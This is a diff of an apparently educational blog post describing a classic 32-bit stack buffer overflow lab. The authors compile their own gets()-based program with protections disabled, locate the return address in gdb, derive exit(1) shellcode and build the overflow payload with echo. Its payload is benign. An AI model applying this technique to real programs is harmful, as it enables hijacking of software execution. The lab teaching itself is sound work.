@@ -7,10 +7,11 @@ pubDate: 2025-02-28T16:00:00.000Z
 tags:
   - Linux
   - Machine Problem
-title: AITA for Spilling Bytes and Crashing the Code?
+title: AWTA for Spilling Bytes to Crash the Code?
 ---
 
 ## 0. AITA for Exploiting a Bug?
+
 Imagine you get a tiny coffee cup at a café, but instead of stopping at the top, you keep pouring—spilling coffee everywhere, even onto someone’s laptop. That’s how buffer overflow works in a program!
 
 Our vulnerable C program (vuln.c) asks for your name but doesn’t check the size. By overflowing the small buffer (8 bytes), we can overwrite memory and change how the program runs—like sneaking a new script into a magic show.
@@ -18,6 +19,7 @@ Our vulnerable C program (vuln.c) asks for your name but doesn’t check the siz
 Instead of letting the program run forever, we’ll inject a special input to hijack execution and make it exit with a return code of 1.
 
 ### Our "Mischievous" Plan:
+
 1. Compile with weak security
 2. Find memory targets using GDB
 3. Rewrite the return address to force an exit.
@@ -26,6 +28,7 @@ Instead of letting the program run forever, we’ll inject a special input to hi
 Boom—program hijacked! Just like spilling coffee in just the right spot to shut down a laptop. ☕💥
 
 ## 1. Compiling the Vulnerable Program
+
 Create a source code file **vuln.c**. This program reads user input into a buffer of 8 bytes using the `gets()` function, which does not check input size, making it vulnerable to buffer overflow. The `gets()` function is dangerous because not only does it not limit input size, it also overwrites adjacent memory—including the saved return address that determines where execution continues when user inputs more than 8 bytes. In short, it allows a user to input more data than the buffer can hold.
 
 ```c
@@ -47,12 +50,13 @@ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z exe
 ```
 
 So what do these flags do?
-- **-m32**: Compile for 32-bit architecture.
-- **-fno-stack-protector**: Disable stack protection (no canary values).
-- **-mpreferred-stack-boundary=2**: Forces a 4-byte aligned stack.
-- **-fno-pie**: No position-independent executable (PIE).
-- **-ggdb**: Includes debugging symbols.
-- **-z execstack**: Allows execution of code on the stack.
+
+* **-m32**: Compile for 32-bit architecture.
+* **-fno-stack-protector**: Disable stack protection (no canary values).
+* **-mpreferred-stack-boundary=2**: Forces a 4-byte aligned stack.
+* **-fno-pie**: No position-independent executable (PIE).
+* **-ggdb**: Includes debugging symbols.
+* **-z execstack**: Allows execution of code on the stack.
 
 Since we are not using Linux, we installed WSL and ran the command: `sudo apt install gcc`. However, upon attempting to compile the vuln.c, we encountered a fatal error:
 
@@ -67,6 +71,7 @@ donna@Donna ~/CyberSec ❯ gcc -m32 -fno-stack-protector -mpreferred-stack-bound
 ```
 
 Error output:
+
 ```sh
 vuln.c: In function 'vuln':
 vuln.c:5:1: warning: 'gets' is deprecated [-Wdeprecated-declarations]
@@ -100,6 +105,7 @@ donna@Donna ~/CyberSec ❯ sudo apt install gdb
 The installation output confirmed that gdb and its dependencies were installed.
 
 ## 2. Finding Addresses
+
 To take advantage of the buffer overflow, we need to know where the program stores its memory. We ran the program inside a debugger (gdb) using:
 
 ```sh
@@ -141,9 +147,11 @@ Our goal is to overwrite the saved return address, which we locate by inspecting
 The output shows that the saved return address is stored at an address (e.g., `0xffffd034`), and that’s where our shellcode will be injected.
 
 ## 3. Obtaining Machine Code
+
 To control how the program behaves after the overflow, we inject our own machine instructions (assembly code). We created an assembly file **asm.c** containing shellcode to exit the program cleanly.
 
 Original **asm.c**:
+
 ```c
 int main() {
     __asm__("xor %eax, %eax;"
@@ -170,6 +178,7 @@ objdump -d asm > asmdump
 The output from **asmdump** is as follows:
 
 Original asmdump:
+
 ```sh
 0000118d <main>:
     118d:	55                   	push   %ebp
@@ -187,6 +196,7 @@ Original asmdump:
 Before writing shellcode, we modify the assembly code to trigger a system call (`int 0x80`), which forces program termination. Our modified **asm.c** becomes:
 
 Modified **asm.c**:
+
 ```c
 int main() {
     __asm__("xor %eax, %eax;"
@@ -198,10 +208,11 @@ int main() {
 ```
 
 Explanation of the instructions:
-- `xor %eax, %eax;` sets EAX to 0.
-- `inc %eax;` increments EAX by 1. In Linux 32-bit, the system call number for `exit()` is 1.
-- `mov %ebx, %eax;` moves the value of EAX (which is 1) into EBX (the exit status).
-- `int 0x80;` triggers a system call to exit.
+
+* `xor %eax, %eax;` sets EAX to 0.
+* `inc %eax;` increments EAX by 1. In Linux 32-bit, the system call number for `exit()` is 1.
+* `mov %ebx, %eax;` moves the value of EAX (which is 1) into EBX (the exit status).
+* `int 0x80;` triggers a system call to exit.
 
 Compile the assembly code and extract the machine code again:
 
@@ -226,20 +237,24 @@ The modified **asmdump** shows:
 ```
 
 The critical machine code instructions for our shellcode are:
-- `31 c0` → `xor    %eax,%eax`
-- `40` → `inc    %eax`
-- `89 c3` → `mov    %eax,%ebx`
-- `cd 80` → `int    $0x80`
+
+* `31 c0` → `xor    %eax,%eax`
+* `40` → `inc    %eax`
+* `89 c3` → `mov    %eax,%ebx`
+* `cd 80` → `int    $0x80`
 
 The final shellcode in hex is:
+
 ```sh
 "\x31\xc0\x40\x89\xc3\xcd\x80"
 ```
 
 ## 4. Writing Down the Shellcode
+
 Shellcode is a sequence of machine instructions designed to be injected into a vulnerable program. We generate our shellcode and save it in a file named **egg**.
 
 Generate the shellcode:
+
 ```sh
 echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x41\x41\x41\x41\x41\x28\xd0\xff\xff" > egg
 ```
@@ -247,24 +262,29 @@ echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x41\x41\x41\x41\x41\x28\xd0\xff\xff" > eg
 This hex-encoded sequence corresponds to our modified assembly instructions, which exit the program cleanly.
 
 Constructing the Payload:
-- `\x41\x41\x41\x41...` → Padding (filling the buffer) which represents ASCII ‘A’
-- `\x28\xd0\xff\xff` → Overwrite EIP with buffer address `0xffffd028`
-- `\x31\xc0\x40\x89\xc3\xcd\x80` → Shellcode to exit
+
+* `\x41\x41\x41\x41...` → Padding (filling the buffer) which represents ASCII ‘A’
+* `\x28\xd0\xff\xff` → Overwrite EIP with buffer address `0xffffd028`
+* `\x31\xc0\x40\x89\xc3\xcd\x80` → Shellcode to exit
 
 ## 5. Running the Program in gdb
+
 Once our shellcode is prepared, we inject and execute it inside gdb to confirm that it works correctly.
 
 Start gdb with the vulnerable executable:
+
 ```sh
 donna@Donna ~/CyberSec ❯ gdb vuln
 ```
 
 Within gdb, feed the shellcode stored in **egg** to the program:
+
 ```sh
 (gdb) run < egg
 ```
 
 Output:
+
 ```sh
 Starting program: /home/donna/CyberSec/vuln < egg
 [Thread debugging using libthread_db enabled]
@@ -275,4 +295,29 @@ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
 
 The shellcode injected via the **egg** file overwrites the return address in memory, redirecting execution to our injected instructions, which execute the `int 0x80` system call to exit. The program terminates with an exit status of `01`, confirming that we have successfully hijacked execution using a buffer overflow exploit.
 
-TL;DR: ✅ Exploit successful 🎯
+### So, AWTA for exploiting a bug?
+
+We've just taken a deep dive into the world of buffer overflow exploits—where a seemingly innocent mistake in code can lead to complete control over a program. By understanding memory layouts, using debugging tools, and tweaking return addresses, we successfully hijacked execution. But now, let’s take a step back and ask: What does this all mean beyond just a fun technical challenge?
+
+Did we technically break the program? Yes. Did we learn something in the process? Also, yes.
+
+So, AW(e)TA for exploiting a bug? On one hand, yes—we intentionally took advantage of a flaw. But on the other hand, this is how we find and fix vulnerabilities before real hackers do. If a simple buffer overflow can let me—us take control, imagine what a malicious attacker could do.
+
+### Final Verdict
+
+🔴 Programmer sucks for using gets() (seriously, never use gets()).
+🟡 We suck for gleefully breaking things, but hey—it was educational.
+🟢 Cybersecurity wins because now we know how to prevent this in the future.
+
+Lesson learned: Always validate input. Always assume users will break things. Always test for vulnerabilities before someone else does.
+
+And next time you see a program asking for input, just remember—sometimes, all it takes is one extra character to tip the cup over. 
+
+After all, the best way to stop a spill is to design a better cup. ☕💻
+
+Stay curious, stay secure, and please don’t use gets(), fgets() might be fine.
+
+TL;DR: ✅Exploit successful 🎯 We broke a C program with a buffer overflow. AWTA for hacking our own code, or is this just ethical hacking in action? 🤔 
+
+
+
